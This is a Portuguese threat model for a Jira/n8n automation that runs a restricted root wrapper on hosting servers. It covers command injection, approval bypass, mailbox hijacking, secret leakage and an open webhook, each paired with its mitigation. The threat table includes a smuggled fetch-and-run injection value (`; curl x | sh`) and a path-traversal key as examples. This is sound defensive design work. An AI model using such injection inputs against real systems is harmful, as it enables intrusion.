# Modelo de ameaças

## Ativos

- Acesso privilegiado aos servidores de hospedagem (root via wrapper).
- Caixas de e-mail dos clientes (senhas, cotas).
- Regras de firewall (CSF/lfd) que protegem os servidores.
- Credenciais da automação: conta de serviço do Jira, chaves SSH, tokens WHM, webhooks.
- Histórico e trilha de auditoria.

## Atores

| Ator | Pode | Não deveria poder |
|---|---|---|
| Qualquer pessoa com permissão de criar card (equipe, cliente via portal, conta comprometida) | Escrever título, descrição, anexos | Executar comando, escolher servidor, receber senha de terceiros |
| Aprovador (grupo de operação) | Mover o card para a coluna de automação | Aprovar o próprio card (quatro olhos) |
| Quem edita workflows no n8n | Alterar a automação | Ler segredos em texto claro (ficam no cofre) |
| Servidor/serviço externo | Responder chamadas | Injetar conteúdo em comentário, Teams ou comando seguinte |
| Remetente do webhook do Kuma | Disparar alertas | Disparar AutoSSL em domínio fora do inventário |

## Ameaças e mitigações

| # | Ameaça | Exemplo | Mitigação | Onde |
|---|---|---|---|---|
| 1 | Injeção de comando via campo do card | `IP: 203.0.113.5; curl x \| sh` | Validador estrito de IP (público, sem sufixos), e-mail e usuário; catálogo fixo; charset seguro obrigatório; wrapper revalida com implementação independente (`ipaddress` do Python, regex bash, `/etc/userdomains`) | `validators.js`, `catalog.js`, `ops-catalog.sh` |
| 2 | Escalada "criar card = virar root" | Card pedindo qualquer coisa que vire shell | Não existe shell livre: a chave SSH só executa o wrapper (`command=`), o sudo só permite o wrapper sem argumentos, o wrapper só conhece 3 operações | `server/` |
| 3 | Execução não autorizada | Card criado e movido pela mesma pessoa, ou por conta comum | Verificação no changelog: última transição para a coluna feita por aprovador; quatro olhos; restrinja também a transição no workflow do Jira a um grupo | `approval.js`, Jira |
| 4 | Alvo errado por correspondência frouxa | "ana" casar com "mariana"; domínio por substring | Match exato de usuário/alias; domínio do e-mail precisa estar na lista da conta; sufixo em fronteira de rótulo; ambiguidade = recusa | `inventory.js`, `ssl.js` |
| 5 | Sequestro de caixa postal | Pedir reset da caixa de outra pessoa e receber a senha | Senha nunca vai para o card; destinatário vem do inventário (contato responsável), não do texto; link de uso único com validade | `plan.js`, `result.js` |
| 6 | Senha adivinhável | Senha com prefixo/sufixo fixo, nome do cliente, ano, `Math.random` | `crypto.randomInt` sobre alfabeto de 67 símbolos, 20 caracteres (~121 bits), todas as classes, sem padrão | `password.js` |
| 7 | Vazamento por histórico | Senha em comentário, em execução salva do n8n, em `ps`, em log do servidor | Comentário sem segredo; workflow de infra com `saveData*Execution: none`; senha vai no corpo HTTPS, não em linha de comando nem query string; auditoria rejeita campos sensíveis | `02-infra-ops.json`, `audit.js` |
| 8 | Abertura permanente do firewall | Desbloquear = colocar em allow/ignore permanente | Desbloqueio remove de deny/temp-deny; allow só temporário e opcional; IP privado/reservado recusado | `ops-catalog.sh` |
| 9 | Repetição e tempestade de execuções | Dois ciclos pegando o mesmo card; loop de retry infinito; card duplicado | Reivindicação com label antes de executar e JQL que exclui o label; deduplicação no ciclo; limite por ciclo; retry contado por `$runIndex`; dedup de SSL por janela; `flock` no wrapper | `plan.js`, `ssl.js`, `ops-catalog.sh` |
| 10 | Credenciais embutidas | Token em nó Code, Base64 no JSON exportado | Só referências por nome ao cofre do n8n; `$env` apenas para configuração; validação do JSON procura tokens, GUIDs, IPs e e-mails reais | `scripts/validate-workflows.js` |
| 11 | Injeção de JSON/markdown em notificação | Aspas no texto de problema do AutoSSL quebrando o payload | Payload montado como objeto e serializado; textos truncados | `ssl.js` |
| 12 | Webhook aberto | Qualquer um dispara AutoSSL | Header de autenticação no webhook; domínio precisa estar no inventário; só eventos de certificado | `03-ssl-autossl.json` |
| 13 | TLS ignorado | `allowUnauthorizedCerts` para falar com o WHM | Desligado em todos os nós; use certificado válido na porta 2087 ou CA interna | workflows |
| 14 | Reflexão de conteúdo do card | Comentário de recusa repetindo texto malicioso | Comentários com mensagens fixas por código de motivo; só valores já validados (IP, e-mail) aparecem | `plan.js`, `result.js` |
| 15 | Path traversal em URL de API | Chave `OPS-1/../..` | Chave de card validada antes de compor URL | `validators.js` |

## Riscos residuais

- **`$env` legível por quem edita workflows.** `N8N_BLOCK_ENV_ACCESS_IN_NODE=false` expõe todas as variáveis do processo a quem pode editar workflows. Por isso nada sensível fica em `$env`; restrinja quem edita workflows e mantenha `N8N_ENCRYPTION_KEY` fora do ambiente lido pelos nós quando o modo de execução permitir (por exemplo, task runners externos).
- **URL do webhook do Teams.** Funciona como segredo portador. Se preferir, troque o nó por um HTTP Request com credencial; mantenha a URL fora do git.
- **Inventário desatualizado.** O inventário é a fonte da verdade; uma conta movida de servidor e não atualizada gera falha (recusa), não execução no lugar errado, porque o wrapper confere dono do domínio localmente.
- **Changelog truncado.** Em cards com histórico muito longo, a API pode não trazer a transição; o resultado é recusa (falha fechada).
- **Senha transita pelo n8n.** A senha existe em memória no n8n entre a geração e a entrega. Alternativa mais forte: gerar no próprio servidor e entregar de lá, sem passar pelo orquestrador.
